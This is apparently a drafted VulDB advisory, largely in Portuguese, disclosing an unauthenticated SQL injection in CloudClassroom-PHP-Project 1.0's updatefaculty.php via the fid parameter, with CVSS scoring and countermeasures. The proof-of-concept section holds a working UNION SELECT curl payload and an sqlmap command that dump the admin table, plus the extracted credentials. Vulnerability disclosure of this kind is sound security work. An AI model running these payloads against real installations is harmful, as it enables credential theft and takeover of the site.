# Submissão VulDB — CloudClassroom-PHP-Project 1.0 — SQL Injection em updatefaculty.php (parâmetro fid)

> Modelo para submeter em https://vuldb.com/?submit — preencha os campos no formulário correspondente.

**Title:** CloudClassroom-PHP-Project 1.0 updatefaculty.php fid SQL Injection

| Campo VulDB | Valor |
|-------------|-------|
| Product | CloudClassroom-PHP-Project |
| Version | 1.0 |
| Vendor | Vishal Mathur |
| Vulnerability class | SQL Injection (UNION-based / error-based) |
| Affected component | updatefaculty.php (Component) |
| Affected parameter/argument | fid |
| Attack vector | Remote (Network) |
| Authentication | Nenhuma (via Broken Access Control — item 00; o design pediria sessão de admin) |
| CWE | CWE-89 |
| CVSS 3.1 Base | 9.1 |
| CVSS 3.1 Vector | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |
| Exploit availability | Público (PoC incluído) |
| Countermeasure | Usar prepared statements com bind de parâmetros (`mysqli`/PDO) em 100% das consultas. |

## Description

A vulnerability was found in CloudClassroom-PHP-Project 1.0. It has been classified as **Crítico**.
This issue affects the component `updatefaculty.php` via the argument `fid`.
O parâmetro `fid` é interpolado sem aspas (numérico) na consulta SELECT. Em contexto numérico é possível `UNION SELECT`. A tabela consultada expõe 9 colunas. Confirmado com dump não-autenticado das credenciais de admin.

The manipulation leads to sql injection. The attack may be initiated remotely.

## Technical Details / Proof of Concept

```bash
curl -s -G "http://127.0.0.1:9292/updatefaculty.php" \
  --data-urlencode "fid=0 UNION SELECT 1,concat(0x5b,Aid,0x3a,Apass,0x5d),3,4,5,6,7,8,9 FROM admin -- -" | grep -oE "\[[^]]*:[^]]*\]"

sqlmap -u "http://127.0.0.1:9292/updatefaculty.php?fid=1" -p fid --batch --dump -T admin
```

Observed evidence:

```
[admin@ics.com:admin]
[vishu:vishu]
```

## Countermeasure

- Usar prepared statements com bind de parâmetros (`mysqli`/PDO) em 100% das consultas.
- Forçar o tipo dos identificadores numéricos (`(int)$id`) e usar allowlist quando aplicável.
- Não ecoar `$sql`/`mysqli_error()` ao cliente (remover oráculo de erro).
- Aplicar `exit;` após o guard de sessão (ver item 00).

## Timeline

- 2026-08-02: Vulnerability discovered and confirmed (local lab).
- 2026-08-02: Advisory prepared / VulDB submission drafted.

## Credits

Researcher: oliveira.luanalmeida@gmail.com e ethical.hacker.tiagoredivo@gmail.com

